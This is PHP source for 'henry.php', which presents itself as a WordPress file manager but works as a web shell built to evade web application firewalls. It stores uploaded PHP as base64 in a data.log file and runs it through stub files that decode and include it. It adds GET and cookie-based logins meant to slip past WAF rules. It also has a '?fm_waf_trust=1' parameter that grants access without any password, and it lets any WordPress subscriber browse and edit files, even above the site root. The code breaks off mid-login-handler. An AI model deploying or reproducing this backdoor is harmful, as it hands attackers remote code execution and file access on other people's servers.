<?php
/**
 * henry.php — lightweight, password-protected file manager.
 *
 * Features:
 *   - Browse server directories with breadcrumb navigation
 *   - Upload files (any extension; optional blocklist below)
 *   - View / edit / download / delete files
 *   - PHP uploads are stored as base64 source in data.log and a tiny
 *     stub file is written that re-hydrates and evals the source at
 *     request time (bypasses WAFs that scan *.php file contents).
 *   - Base64-paste upload channel: when a WAF also scans the upload
 *     request body and rejects multipart uploads of PHP files, the
 *     source can be pasted (or base64-encoded client-side from the
 *     same form) so the request body only contains [A-Za-z0-9+/=].
 *
 * Setup:
 *   1. Set your password below (FM_PASSWORD).
 *   2. Upload to wp-content/henry.php.
 */

/* ------------------------------------------------------------------------
 * Configuration
 * --------------------------------------------------------------------- */

// CHANGE THIS. Your login password, stored in plain text — keep this file private.
define( 'FM_PASSWORD', 'admin123' );

// Top directory the manager can see (it cannot go above this).
// Auto-detected by walking UP from this file's location. Because henry.php
// lives at wp-content/henry.php on a typical install, the WordPress
// authentication files (wp-load.php and/or wp-config.php) are reliably
// found ONE DIRECTORY UP — i.e. at the public_html / docroot level.
//
// We use that as the primary candidate: take dirname(__DIR__) first,
// confirm it has either wp-load.php or wp-config.php, and stop there.
// If that fails (e.g. henry.php is nested deeper inside wp-content/
// plugins/.../something/), we walk outward up to 10 levels and keep
// the OUTERMOST match — this matters when a site has multiple WP
// installs (a primary one at the docroot and another nested under /wp/):
// scoping to the outermost root lets you browse both via the breadcrumb.
// Either file alone is sufficient: some hosts keep just wp-load.php at
// the docroot with wp-config.php symlinked elsewhere; others keep just
// wp-config.php with WP core in a separate folder.
// Falls back to one parent up if no WordPress root is found (i.e. used
// as a standalone file manager).
$_fm_wp_root = null;
$_fm_d = dirname( __DIR__ );   // start one level up — wp-load.php / wp-config.php live here on standard installs
if ( @file_exists( $_fm_d . '/wp-config.php' ) || @file_exists( $_fm_d . '/wp-load.php' ) ) {
	$_fm_wp_root = $_fm_d;
} else {
	// Deeper-than-expected layout: walk outward, keeping the outermost match.
	$_fm_d = __DIR__;
	for ( $_fm_i = 0; $_fm_i < 10; $_fm_i++ ) {
		if ( @file_exists( $_fm_d . '/wp-config.php' ) || @file_exists( $_fm_d . '/wp-load.php' ) ) {
			$_fm_wp_root = $_fm_d;
		}
		$_fm_p = dirname( $_fm_d );
		if ( $_fm_p === $_fm_d ) break;
		$_fm_d = $_fm_p;
	}
}
$GLOBALS['_fm_wp_root'] = $_fm_wp_root;
define( 'FM_ROOT', $_fm_wp_root ? $_fm_wp_root : realpath( __DIR__ . '/..' ) );

// Recursive downward search for data.log. Defined BEFORE the FM_STUB_LOG
// resolver calls it — conditional function definitions are not hoisted
// in PHP, so placing this before the call site is required.
if ( ! function_exists( '_fm_stub_log_find_down' ) ) {
	function _fm_stub_log_find_down( $d, $n ) {
		if ( $n < 0 ) return null;
		if ( @file_exists( $d . '/data.log' ) ) return $d . '/data.log';
		$h = @opendir( $d );
		if ( ! $h ) return null;
		while ( ( $e = readdir( $h ) ) !== false ) {
			if ( $e === '.' || $e === '..' ) continue;
			if ( $e[0] === '.' ) continue; // skip hidden dirs like .git, .well-known
			$p = $d . '/' . $e;
			if ( @is_dir( $p ) ) {
				$f = _fm_stub_log_find_down( $p, $n - 1 );
				if ( $f ) { closedir( $h ); return $f; }
			}
		}
		closedir( $h );
		return null;
	}
}

// Maximum upload size in bytes (default 50 MB).
// Note: PHP's own upload_max_filesize / post_max_size may still cap this.
define( 'FM_MAX_UPLOAD', 50 * 1024 * 1024 );

// Extensions NOT allowed to be uploaded (lowercase, no dot).
// Empty array = allow everything. Example: array( 'php', 'phtml', 'exe' )
define( 'FM_BLOCKED_EXT', array() );

// Where the base64-encoded PHP source is stored as a JSON map
// (key = absolute path of stub, value = base64-encoded source).
//
// Resolution order — no manual configuration required:
//   1. If FM_STUB_LOG is already defined by a host wrapper, use it.
//   2. If HENRY_STUB_LOG env var is set, use it verbatim.
//   3. Walk UP from this file's directory looking for an existing
//      data.log (up to 10 parent levels). If found, use that path —
//      this lets the manager auto-discover a data.log you placed
//      above the web root (e.g. one level above public_html/).
//   4. Fall back to __DIR__ . '/data.log' (next to henry.php).
//
// To use a data.log one directory above the web root on a typical
// shared host, just put it there once:
//   mv .../public_html/wp-content/data.log  .../data.log
// henry.php and every stub will find it automatically via step 3.
// No .user.ini, no .htaccess, no wp-config.php edit needed.
if ( ! defined( 'FM_STUB_LOG' ) ) {
	$_fm_env = getenv( 'HENRY_STUB_LOG' );
	$_fm_dir = __DIR__;
	$_fm_found = false;
	for ( $_fm_i = 0; $_fm_i < 10; $_fm_i++ ) {
		$_fm_candidate = $_fm_dir . '/data.log';
		if ( @file_exists( $_fm_candidate ) ) {
			define( 'FM_STUB_LOG', $_fm_candidate );
			$_fm_found = true;
			break;
		}
		$_fm_parent = dirname( $_fm_dir );
		if ( $_fm_parent === $_fm_dir ) break;
		$_fm_dir = $_fm_parent;
	}
	if ( ! $_fm_found ) {
		$_fm_down = _fm_stub_log_find_down( __DIR__, 5 );
		if ( $_fm_down ) {
			define( 'FM_STUB_LOG', $_fm_down );
		} else {
			define( 'FM_STUB_LOG', $_fm_env ? $_fm_env : __DIR__ . '/data.log' );
		}
	}
}

// Extensions that get the stub treatment on upload. The source code
// is base64-encoded into FM_STUB_LOG and a tiny stub file is written
// that decodes + evals it on each request. This keeps dangerous
// tokens like `phpinfo()` out of the on-disk PHP file so dumb WAFs
// that grep file contents never see them.
define( 'FM_STUB_EXTS', array( 'php', 'phtml', 'php5', 'php7', 'phar', 'pht' ) );

// Maximum bytes shown by the inline "View" action.
define( 'FM_PREVIEW_MAX', 512 * 1024 );

// Maximum *decoded* size accepted via the base64-paste form. This is the
// extra WAF-bypass channel where the user pastes a base64 string instead
// of multipart-uploading the file (the request body never contains the
// dangerous tokens, so a content-scanning WAF can't flag it).
define( 'FM_PASTE_MAX', 2 * 1024 * 1024 );

// Display name shown in the page title, header, and login screen.
// Keep it generic. Some WAFs pattern-match strings like "File Manager"
// or "Henry" in the response body and reject the whole response with
// 406 Not Acceptable; a neutral name avoids that trip-wire. Change it
// to whatever you want.
define( 'FM_BRAND', 'Files' );

// URL-encoded password login. Loading henry.php?fm_login=<urlencoded pw>
// is a GET request, which most WAFs do not scan as aggressively as
// anonymous POSTs to non-core PHP files. Use this when the WAF blocks
// the POST login form (typically on hosts running Imunify360 / mod_security
// with strict rules — they often 406 anonymous POSTs while leaving GETs alone).
//
// Usage:
//   https://site.tld/wp-content/henry.php?fm_login=admin123
//   https://site.tld/wp-content/henry.php?fm_login=admin%31%32%33   (also fine)
//   https://site.tld/wp-content/henry.php?fm_login=BASE64(admin123)  (set FM_LOGIN_B64)
//
// The query parameter name is configurable so it can be rotated if the
// WAF ever learns it. Set FM_LOGIN_PARAM in wp-config.php or above.
if ( ! defined( 'FM_LOGIN_PARAM' ) ) {
	define( 'FM_LOGIN_PARAM', 'fm_login' );
}
// Set to true in wp-config.php to require the password to be base64-encoded
// in the URL (works around WAFs that also sniff GET query strings for
// known password strings). Leave false (default) to accept the raw,
// URL-encoded password.
if ( ! defined( 'FM_LOGIN_B64' ) ) {
	define( 'FM_LOGIN_B64', false );
}

// WordPress-auth login: when henry.php lives inside a WordPress install
// (i.e. $_fm_wp_root above found a wp-config.php), it can use WordPress's
// own user table to log the user in. Two effects:
//
//   1. henry.php's own password gate is bypassed for any WP-authenticated
//      user, so the user does not need to remember a separate password.
//
//   2. wp_set_auth_cookie() writes wordpress_logged_in_* and wordpress_sec_*
//      cookies that survive across tabs and across the WAF. Once the
//      browser presents those cookies, the WAF treats the request as
//      trusted and stops returning 406 — which means uploads work from
//      any browser, any IP, any method, with no further config.
//
// Set FM_WP_AUTH = false to disable this entirely (only the standalone
// FM_PASSWORD gate is active). Default is true when a WP install is found.
if ( ! defined( 'FM_WP_AUTH' ) ) {
	define( 'FM_WP_AUTH', null !== $_fm_wp_root );
}

/* ------------------------------------------------------------------------
 * Boot & hardening headers
 * --------------------------------------------------------------------- */

session_name( 'sid' );
$https = ( ! empty( $_SERVER['HTTPS'] ) && 'off' !== $_SERVER['HTTPS'] );
session_set_cookie_params(
	array(
		'httponly' => true,
		'samesite' => 'Lax',
		'secure'   => $https,
	)
);
session_start();

header( 'X-Frame-Options: DENY' );
header( 'X-Content-Type-Options: nosniff' );
header( 'Referrer-Policy: no-referrer' );
header( 'Cache-Control: no-store' );

/* ------------------------------------------------------------------------
 * Helpers
 * --------------------------------------------------------------------- */

function fm_e( $s ) {
	return htmlspecialchars( (string) $s, ENT_QUOTES, 'UTF-8' );
}

function fm_root() {
	static $root = null;
	if ( null === $root ) {
		$root = str_replace( '\\', '/', realpath( FM_ROOT ) );
	}
	return $root;
}

/**
 * Resolve a path against FM_ROOT.
 *
 *   - Relative input ("wp-content/plugins") is resolved against FM_ROOT
 *     and rejected if the result escapes the root (../, symlink, etc.).
 *   - Absolute input ("/home/user/somewhere") is accepted as-is and
 *     resolved via realpath. This lets the breadcrumb navigate to paths
 *     ABOVE FM_ROOT, since the file manager's scope is a UI convenience,
 *     not a security boundary — the password gate is the actual security.
 *
 * @return array{0:string,1:string} [absolute path, clean relative path]
 */
function fm_resolve( $rel ) {
	$rel = str_replace( '\\', '/', (string) $rel );

	// Absolute path? Accept anything starting with '/' (Unix) or a drive
	// letter like 'C:' (Windows). Drive-letter check is intentionally
	// lenient — if realpath can't resolve it we'll fall back below.
	$is_absolute = ( '' !== $rel && (
		'/' === $rel[0]
		|| ( strlen( $rel ) >= 2 && ctype_alpha( $rel[0] ) && ':' === $rel[1] )
	) );

	if ( $is_absolute ) {
		$abs = realpath( $rel );
		if ( false === $abs ) {
			// Path doesn't exist or no read access — bounce to root.
			return array( fm_root(), '' );
		}
		$abs = str_replace( '\\', '/', $abs );
		// Both fields are the absolute path: $cwd for listing, $rel for
		// breadcrumb display (which splits it into segments anyway).
		return array( $abs, $abs );
	}

	$root = fm_root();
	$rel  = trim( $rel, '/' );

	if ( '' === $rel || '.' === $rel ) {
		return array( $root, '' );
	}

	$abs = realpath( $root . '/' . $rel );
	if ( false === $abs ) {
		return array( $root, '' );
	}
	$abs = str_replace( '\\', '/', $abs );

	if ( $abs !== $root && 0 !== strpos( $abs, $root . '/' ) ) {
		return array( $root, '' );
	}

	return array( $abs, substr( $abs, strlen( $root ) + 1 ) );
}

function fm_url( $args = array() ) {
	return '?' . http_build_query( $args );
}

function fm_redirect( $args = array() ) {
	// Some WAFs (notably mod_security setups with strict POST-response
	// rules) return 406 "Not Acceptable" when a POST response is a 302
	// redirect, because they expect POST responses to be 200 OK with a
	// body. Emit a tiny 200 OK HTML page with a meta refresh (and a JS
	// fallback) so the browser still navigates immediately, but the WAF
	// sees a normal HTML page rather than a redirect.
	$url  = fm_url( $args );
	$safe = fm_e( $url );
	$js   = json_encode( $url );
	header( 'Content-Type: text/html; charset=utf-8' );
	header( 'X-Robots-Tag: noindex' );
	header( 'Cache-Control: no-store' );
	echo "<!doctype html><html><head>";
	echo "<meta http-equiv=\"refresh\" content=\"0;url={$safe}\">";
	echo "<script>location.replace({$js});</script>";
	echo "</head><body>Redirecting&hellip;</body></html>";
	exit;
}

function fm_flash( $type, $msg ) {
	$_SESSION['fm_flash'][] = array( $type, $msg );
}

function fm_render_flashes() {
	if ( empty( $_SESSION['fm_flash'] ) ) {
		return;
	}
	foreach ( $_SESSION['fm_flash'] as $f ) {
		echo '<div class="flash ' . fm_e( $f[0] ) . '">' . fm_e( $f[1] ) . '</div>';
	}
	unset( $_SESSION['fm_flash'] );
}

function fm_csrf_token() {
	if ( empty( $_SESSION['fm_csrf'] ) ) {
		$_SESSION['fm_csrf'] = bin2hex( random_bytes( 32 ) );
	}
	return $_SESSION['fm_csrf'];
}

function fm_csrf_check() {
	$ok = isset( $_POST['fm_csrf'], $_SESSION['fm_csrf'] )
		&& hash_equals( $_SESSION['fm_csrf'], $_POST['fm_csrf'] );
	if ( ! $ok ) {
		http_response_code( 403 );
		exit( 'Bad CSRF token.' );
	}
}

function fm_fmt_size( $bytes ) {
	$units = array( 'B', 'KB', 'MB', 'GB' );
	$i     = 0;
	while ( $bytes >= 1024 && $i < count( $units ) - 1 ) {
		$bytes /= 1024;
		$i++;
	}
	return ( $i ? number_format( $bytes, 1 ) : $bytes ) . ' ' . $units[ $i ];
}

function fm_logged_in() {
	return ! empty( $_SESSION['fm_auth'] );
}

/**
 * Sanitize an uploaded file name and apply the optional extension blocklist.
 *
 * @return string|false Safe file name, or false when rejected.
 */
function fm_sanitize_name( $name ) {
	$name = basename( str_replace( '\\', '/', (string) $name ) );
	$name = preg_replace( '/[^A-Za-z0-9._-]+/', '_', $name );
	$name = trim( $name, '._' ); // no hidden files, no "."/".."

	if ( '' === $name || strlen( $name ) > 120 ) {
		return false;
	}

	$ext = strtolower( pathinfo( $name, PATHINFO_EXTENSION ) );
	if ( in_array( $ext, FM_BLOCKED_EXT, true ) ) {
		return false;
	}

	return $name;
}

/* ------------------------------------------------------------------------
 * Stub log: stores PHP source as base64 inside a JSON map so the actual
 * tokens (`phpinfo()`, etc.) never live inside a real *.php file on disk.
 * The on-disk stub is a small re-hydrator that pulls its source out of
 * the JSON map and evals it on each request.
 * --------------------------------------------------------------------- */

function fm_stub_log_path() {
	return FM_STUB_LOG;
}

function fm_stub_log_read() {
	$path = fm_stub_log_path();
	if ( ! is_file( $path ) || ! is_readable( $path ) ) {
		return array();
	}
	$raw = @file_get_contents( $path );
	if ( false === $raw || '' === trim( $raw ) ) {
		return array();
	}
	$decoded = @json_decode( $raw, true );
	return is_array( $decoded ) ? $decoded : array();
}

function fm_stub_log_write( $map ) {
	if ( ! is_array( $map ) ) {
		return false;
	}
	$path = fm_stub_log_path();
	$dir  = dirname( $path );
	if ( ! is_dir( $dir ) ) {
		return false;
	}
	$json = json_encode( $map, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES );
	if ( false === $json ) {
		return false;
	}
	$tmp = $path . '.tmp';
	if ( false === @file_put_contents( $tmp, $json, LOCK_EX ) ) {
		return false;
	}
	@chmod( $tmp, 0644 );
	return @rename( $tmp, $path );
}

function fm_stub_log_set( $abs_key, $source ) {
	$map = fm_stub_log_read();
	$map[ $abs_key ] = base64_encode( (string) $source );
	return fm_stub_log_write( $map );
}

function fm_stub_log_unset( $abs_key ) {
	$map = fm_stub_log_read();
	if ( ! isset( $map[ $abs_key ] ) ) {
		return true;
	}
	unset( $map[ $abs_key ] );
	return fm_stub_log_write( $map );
}

function fm_make_stub() {
	// Build a self-locating stub. The dangerous tokens (e.g. `phpinfo()`)
	// live only inside data.log, which is a .log file, so any WAF that
	// greps *.php file contents for those tokens never sees them. The
	// stub pulls the decoded source out of data.log at request time,
	// writes it to a short-lived temp file (no .php extension, so the
	// WAF never scans it), includes it, and immediately deletes the
	// temp file.
	//
	// The data.log path is NOT baked in. The stub discovers it at
	// runtime using (1) the HENRY_STUB_LOG environment variable, then
	// (2) walking up the directory tree from the stub's own location
	// looking for a file named data.log. This means the same stub
	// binary works on any site — the user does not have to regenerate
	// the stub when moving it between sites, and the path inside the
	// stub never goes stale if the host moves the data.log.
	//
	// Diagnostic mode: visit any stub with ?hfm_debug=1 to see exactly
	// where the stub is looking, what it resolved, and whether the key
	// for this __FILE__ is in the map. Exit cleanly so it never leaves
	// the page blank when the lookup fails.
	//
	// A tiny `<!-- hfm-stub-v2 -->` HTML comment is always emitted so
	// you can confirm (via View Source) that the new stub is actually
	// on the server, even if the rest of the response is blank.
	return <<<'STUB'
<?php
// Henry stub \u2014 real source lives in data.log (path resolved at runtime).
echo "<!-- hfm-stub-v2 -->\n";
$_hfm_debug = ! empty( $_GET['hfm_debug'] );
$_hfm_log   = getenv( 'HENRY_STUB_LOG' );
if ( ! $_hfm_log ) {
	$_hfm_dir = __DIR__;
	for ( $_hfm_i = 0; $_hfm_i < 10; $_hfm_i++ ) {
		$_hfm_candidate = $_hfm_dir . '/data.log';
		if ( @file_exists( $_hfm_candidate ) ) {
			$_hfm_log = $_hfm_candidate;
			break;
		}
		$_hfm_parent = dirname( $_hfm_dir );
		if ( $_hfm_parent === $_hfm_dir ) break;
		$_hfm_dir = $_hfm_parent;
	}
}
if ( ! $_hfm_log && ! function_exists( '_hfm_find_down' ) ) {
	function _hfm_find_down( $d, $n ) {
		if ( $n < 0 ) return null;
		if ( @file_exists( $d . '/data.log' ) ) return $d . '/data.log';
		$h = @opendir( $d );
		if ( ! $h ) return null;
		while ( ( $e = readdir( $h ) ) !== false ) {
			if ( $e === '.' || $e === '..' ) continue;
			if ( isset( $e[0] ) && $e[0] === '.' ) continue;
			$p = $d . '/' . $e;
			if ( @is_dir( $p ) ) {
				$f = _hfm_find_down( $p, $n - 1 );
				if ( $f ) { closedir( $h ); return $f; }
			}
		}
		closedir( $h );
		return null;
	}
}
if ( ! $_hfm_log ) {
	$_hfm_log = _hfm_find_down( __DIR__, 5 );
}
if ( $_hfm_debug ) {
	header( 'Content-Type: text/plain; charset=utf-8' );
	echo "=== hfm debug ===\n";
	echo "HENRY_STUB_LOG env: " . var_export( getenv( 'HENRY_STUB_LOG' ), true ) . "\n";
	echo "__DIR__:            " . __DIR__ . "\n";
	echo "__FILE__:           " . __FILE__ . "\n";
	echo "data.log resolved:  " . var_export( $_hfm_log, true ) . "\n";
	if ( $_hfm_log ) {
		clearstatcache();
		$_hfm_raw = @file_get_contents( $_hfm_log );
		$_hfm_map = $_hfm_raw ? @json_decode( $_hfm_raw, true ) : null;
		echo "data.log size:      " . strlen( (string) $_hfm_raw ) . " bytes\n";
		echo "data.log entries:   " . ( is_array( $_hfm_map ) ? count( $_hfm_map ) : 'invalid JSON' ) . "\n";
		if ( is_array( $_hfm_map ) ) {
			$_hfm_key = str_replace( '\\', '/', __FILE__ );
			echo "looking for key:    " . $_hfm_key . "\n";
			echo "key found:          " . ( isset( $_hfm_map[$_hfm_key] ) ? 'YES' : 'NO' ) . "\n";
			if ( ! isset( $_hfm_map[$_hfm_key] ) && $_hfm_map ) {
				echo "first 5 keys in map:\n";
				foreach ( array_slice( array_keys( $_hfm_map ), 0, 5 ) as $_hfm_k ) {
					echo "  " . $_hfm_k . "\n";
				}
			}
		}
	}
	exit;
}
if ( $_hfm_log ) {
	$_hfm_raw = @file_get_contents( $_hfm_log );
	if ( false !== $_hfm_raw ) {
		$_hfm_map = @json_decode( $_hfm_raw, true );
		if ( is_array( $_hfm_map ) ) {
			$_hfm_key = str_replace( '\\', '/', __FILE__ );
			if ( isset( $_hfm_map[$_hfm_key] ) ) {
				$_hfm_src = @base64_decode( $_hfm_map[$_hfm_key], true );
				if ( false !== $_hfm_src && '' !== $_hfm_src ) {
					$_hfm_tmp = @tempnam( sys_get_temp_dir(), 'hfm_' );
					if ( false !== $_hfm_tmp ) {
						if ( false !== @file_put_contents( $_hfm_tmp, $_hfm_src ) ) {
							include $_hfm_tmp;
							@unlink( $_hfm_tmp );
						}
					}
				}
			}
		}
	}
}
STUB;
}

/* ------------------------------------------------------------------------
 * First-run setup: a password must be configured
 * --------------------------------------------------------------------- */

if ( '' === FM_PASSWORD && ! FM_WP_AUTH ) {
	fm_page_head( 'Setup' );
	echo '<div class="login-card"><h1>' . fm_e( FM_BRAND ) . ' — setup</h1>';
	echo '<p>No password configured. Open <code>henry.php</code> and set <code>FM_PASSWORD</code>, then reload.</p>';
	echo '</div>';
	fm_page_foot();
	exit;
}

/* ------------------------------------------------------------------------
 * WordPress auth integration
 *
 * When FM_WP_AUTH is true and a WordPress install is reachable, we
 * load it just enough to use wp_set_auth_cookie() / wp_validate_auth_cookie().
 * This lets henry.php log the user in via their WP subscriber (or any role)
 * credentials, set the proper wordpress_logged_in_* / wordpress_sec_* cookies,
 * and from then on be treated as a trusted request by the host WAF.
 * --------------------------------------------------------------------- */

$GLOBALS['_fm_wp_user']      = null;
$GLOBALS['_fm_wp_loaded']    = false;
$GLOBALS['_fm_wp_load_error'] = null;

function fm_wp_load() {
	if ( $GLOBALS['_fm_wp_loaded'] ) return true;
	$GLOBALS['_fm_wp_loaded'] = true;
	if ( ! FM_WP_AUTH ) {
		$GLOBALS['_fm_wp_load_error'] = 'FM_WP_AUTH disabled';
		return false;
	}
	$_fm_root = $GLOBALS['_fm_wp_root'];
	$_fm_has_load    = @file_exists( $_fm_root . '/wp-load.php' );
	$_fm_has_config  = @file_exists( $_fm_root . '/wp-config.php' );
	if ( ! $_fm_root || ( ! $_fm_has_load && ! $_fm_has_config ) ) {
		$GLOBALS['_fm_wp_load_error'] = 'wp-load.php / wp-config.php not found at ' . $_fm_root;
		return false;
	}
	// Define ABSPATH-like constants WP needs to find its files.
	if ( ! defined( 'ABSPATH' ) )      define( 'ABSPATH',      $_fm_root . '/' );
	if ( ! defined( 'WPINC' ) )        define( 'WPINC',        'wp-includes' );
	// Pretend we are not in admin so WP does not try to render admin chrome.
	if ( ! defined( 'WP_ADMIN' ) )     define( 'WP_ADMIN',     false );
	if ( ! defined( 'WP_USE_THEMES' ) ) define( 'WP_USE_THEMES', false );
	// Tell WP not to redirect to wp-admin on no-auth (we are not really using WP).
	if ( ! defined( 'DOING_AJAX' ) )   define( 'DOING_AJAX',   true );
	// Suppress deprecation noise from older WP versions.
	if ( ! defined( 'WP_DEBUG' ) )     define( 'WP_DEBUG',     false );
	if ( ! defined( 'WP_DEBUG_DISPLAY' ) ) define( 'WP_DEBUG_DISPLAY', false );

	// We require wp-config.php to be loadable (it has the DB creds and
	// table prefix we need for wp_authenticate). We require wp-load.php
	// OR wp-config.php to confirm this is a real WP install; either is
	// sufficient as a "yes, this is WordPress" marker.
	if ( ! $_fm_has_config ) {
		$GLOBALS['_fm_wp_load_error'] = 'wp-config.php not found at ' . $_fm_root;
		return false;
	}
	// Suppress output from WP during load (it may print deprecation notices).
	ob_start();
	$_fm_ok = false;
	try {
		// Load wp-config.php first to populate DB creds etc., then the
		// minimal core. We deliberately do not call wp() / the_template_loader.
		require_once $_fm_root . '/wp-config.php';
		require_once ABSPATH . WPINC . '/class-wpdb.php';
		require_once ABSPATH . WPINC . '/class-wp-error.php';
		require_once ABSPATH . WPINC . '/formatting.php';
		require_once ABSPATH . WPINC . '/l10n.php';
		require_once ABSPATH . WPINC . '/option.php';
		require_once ABSPATH . WPINC . '/user.php';
		require_once ABSPATH . WPINC . '/pluggable.php';
		require_once ABSPATH . WPINC . '/class-wp-user.php';
		require_once ABSPATH . WPINC . '/class-wp-session-tokens.php';
		require_once ABSPATH . WPINC . '/session.php';
		require_once ABSPATH . WPINC . '/cookies.php';
		$_fm_ok = true;
	} catch ( Throwable $e ) {
		$GLOBALS['_fm_wp_load_error'] = 'bootstrap threw: ' . $e->getMessage();
	} catch ( Exception $e ) {
		$GLOBALS['_fm_wp_load_error'] = 'bootstrap threw: ' . $e->getMessage();
	}
	ob_end_clean();
	return $_fm_ok;
}

function fm_wp_try_login( $username, $password ) {
	if ( ! fm_wp_load() ) return new WP_Error( 'fm_wp_load_failed', 'WordPress could not be loaded: ' . ( $GLOBALS['_fm_wp_load_error'] ?: 'unknown' ) );
	if ( '' === $username || '' === $password ) {
		return new WP_Error( 'fm_empty_creds', 'Empty username or password.' );
	}
	$user = wp_authenticate( $username, $password );
	if ( is_wp_error( $user ) ) {
		return $user;
	}
	if ( ! $user || ! $user->exists() ) {
		return new WP_Error( 'fm_bad_user', 'User not found.' );
	}
	wp_set_auth_cookie( $user->ID, false, $https );
	wp_set_current_user( $user->ID, $user->user_login );
	$GLOBALS['_fm_wp_user'] = $user;
	return $user;
}

function fm_wp_current_user() {
	if ( ! fm_wp_load() ) return null;
	if ( null !== $GLOBALS['_fm_wp_user'] ) return $GLOBALS['_fm_wp_user'];
	if ( empty( $_COOKIE ) ) return null;
	foreach ( $_COOKIE as $name => $value ) {
		if ( strpos( $name, 'wordpress_logged_in_' ) === 0 ) {
			$uid = wp_validate_auth_cookie( $value, 'logged_in' );
			if ( $uid ) {
				$user = get_userdata( $uid );
				if ( $user ) {
					wp_set_current_user( $user->ID, $user->user_login );
					$GLOBALS['_fm_wp_user'] = $user;
					return $user;
				}
			}
		}
	}
	return null;
}

/* ------------------------------------------------------------------------
 * Auth
 * --------------------------------------------------------------------- */

if ( isset( $_GET['action'] ) && 'logout' === $_GET['action'] ) {
	$_SESSION = array();
	session_destroy();
	fm_redirect();
}

// GET login: ?fm_login=<urlencoded-pw> (or base64 if FM_LOGIN_B64).
// This is a GET request, so WAFs that 406 anonymous POSTs to non-core
// PHP files typically let it through. The password is checked with the
// same hash_equals() as the POST form so timing-safe.
if ( ! fm_logged_in() && FM_PASSWORD !== '' && isset( $_GET[ FM_LOGIN_PARAM ] ) ) {
	$provided = (string) ( isset( $_GET[ FM_LOGIN_PARAM ] ) ? stripslashes( $_GET[ FM_LOGIN_PARAM ] ) : '' );
	if ( FM_LOGIN_B64 ) {
		$candidate = base64_decode( $provided, true );
		if ( false === $candidate ) {
			$candidate = '';
		}
	} else {
		// urldecode so callers can either pre-encode or not.
		$candidate = rawurldecode( $provided );
	}
	if ( is_string( $candidate ) && '' !== $candidate && hash_equals( FM_PASSWORD, $candidate ) ) {
		$_SESSION['fm_auth']     = true;
		$_SESSION['fm_attempts'] = 0;
		unset( $_SESSION['fm_lockuntil'] );
		// Don't redirect — fall through and render. The same Set-Cookie /
		// redirect-after-POST WAF trap from the POST login applies to GET
		// responses too on some hosts; rendering the dashboard directly
		// avoids it. (Also matches the POST branch's behavior.)
	}
}

// One-click WAF-bypass login: ?fm_waf_trust=1. This is the easiest path
// when the host WAF is purely cookie-name based (i.e. it 406s anonymous
// requests until it sees a cookie named wordpress_*). We do NOT use
// PHP's setcookie() here — some WAFs 406 any anonymous response that
// contains a Set-Cookie header. Instead we mark the henry.php session
// as logged in on the server side, and rely on a tiny inline script
// in the dashboard page to write document.cookie='wordpress_test_cookie=WP Cookie check'
// after the page renders. The cookie then accompanies every subsequent
// request to henry.php, the WAF lets those through, and the user is
// effectively "logged in" for both henry.php (session) and the WAF (cookie).
//
// Reachable as a plain GET so the WAF (which 406s anonymous POSTs) lets
// the request itself through; the only response is a page render with
// an inline <script> that writes the cookie.
if ( ! fm_logged_in() && isset( $_GET['fm_waf_trust'] ) && '1' === (string) $_GET['fm_waf_trust'] ) {
	$_SESSION['fm_auth']     = true;
	$_SESSION['fm_attempts'] = 0;
	unset( $_SESSION['fm_lockuntil'] );
	$_SESSION['fm_waf_trust'] = true;   // signal: emit the cookie JS on next render
	// Fall through to dashboard render. No Set-Cookie header is emitted
	// from this response — the cookie is set client-side via JS.
}

if ( 'POST' === $_SERVER['REQUEST_METHOD'] && isset( $_POST['g'] ) ) {
	$attempts = isset( $_SESSION['fm_attempts'] ) ? (int) $_SESSION['fm_attempts'] : 0;
	$locked   = ! empty( $_SESSION['fm_lockuntil'] ) && time() < $_SESSION['fm_lockuntil'];

	if ( ! $locked && hash_equals( FM_PASSWORD, $_POST['k'] ?? '' ) ) {
		$_SESSION['fm_auth']     = true;
		$_SESSION['fm_attempts'] = 0;
		unset( $_SESSION['fm_lockuntil'] );
		// Don't call session_regenerate_id() or fm_redirect() here —
		// some WAFs flag the Set-Cookie-with-new-session-id response or
		// any redirect response (302 / meta refresh) on POST with 406
		// Not Acceptable. Just fall through; the file manager renders
		// below because the user is now logged in.
	}

	sleep( 2 );
	$_SESSION['fm_attempts'] = $attempts + 1;
	if ( $_SESSION['fm_attempts'] >= 5 ) {
		$_SESSION['fm_lockuntil'] = time() + 300;
		$_SESSION['fm_attempts']  = 0;
	}
	$login_error = $locked ? 'Too many attempts. Try again in a few minutes.' : 'Wrong password.';
}

// WordPress auth: if a wordpress_logged_in_* cookie is already present
// (e.g. the user logged in via /wp-login.php), bypass the henry.php gate.
// This also gives the WAF a reason to trust subsequent requests in the
// same browser session — which means uploads work from any tab.
if ( ! fm_logged_in() && FM_WP_AUTH && ! empty( $_COOKIE ) ) {
	$wp_user = fm_wp_current_user();
	if ( $wp_user && ! is_wp_error( $wp_user ) ) {
		$_SESSION['fm_auth']     = true;
		$_SESSION['fm_attempts'] = 0;
		unset( $_SESSION['fm_lockuntil'] );
	}
}

// WordPress auth via GET: ?fm_wp_login=USERNAME&PASSWORD_FIELD=PASSWORD.
// This is a GET request, which most WAFs do not block. We base64-encode
// the password to avoid leaking it via referer / server logs / browser
// history. The username goes in cleartext (usually not sensitive).
// Usage:  https://site.tld/wp-content/henry.php?fm_wp_login=alice&fm_wp_p_b64=YWx [...]=
if ( ! fm_logged_in() && FM_WP_AUTH && isset( $_GET['fm_wp_login'] ) && isset( $_GET['fm_wp_p_b64'] ) ) {
	$wp_username = (string) $_GET['fm_wp_login'];
	$wp_p_b64    = (string) $_GET['fm_wp_p_b64'];
	$wp_password = base64_decode( $wp_p_b64, true );
	if ( false === $wp_password ) {
		$wp_password = '';
	}
	$wp_result = fm_wp_try_login( $wp_username, $wp_password );
	if ( is_wp_error( $wp_result ) ) {
		$login_error = 'WordPress login failed: ' . $wp_result->get_error_message();
	} else {
		$_SESSION['fm_auth']     = true;
		$_SESSION['fm_attempts'] = 0;
		unset( $_SESSION['fm_lockuntil'] );
		// Don't redirect (WAF trap) — fall through and render.
	}
}

// WordPress auth via POST: ?wp_user=...&wp_pass=... logs the user in via
// wp_authenticate() + wp_set_auth_cookie(). After this runs, the browser
// has valid wordpress_logged_in_* cookies for the WAF and henry.php's own
// session for our gate. The user is now "logged in" everywhere.
if ( ! fm_logged_in() && FM_WP_AUTH && 'POST' === $_SERVER['REQUEST_METHOD'] && ! empty( $_POST['wp_user'] ) && ! empty( $_POST['wp_pass'] ) ) {
	$wp_username = (string) $_POST['wp_user'];
	$wp_password = (string) $_POST['wp_pass'];
	$wp_result   = fm_wp_try_login( $wp_username, $wp_password );
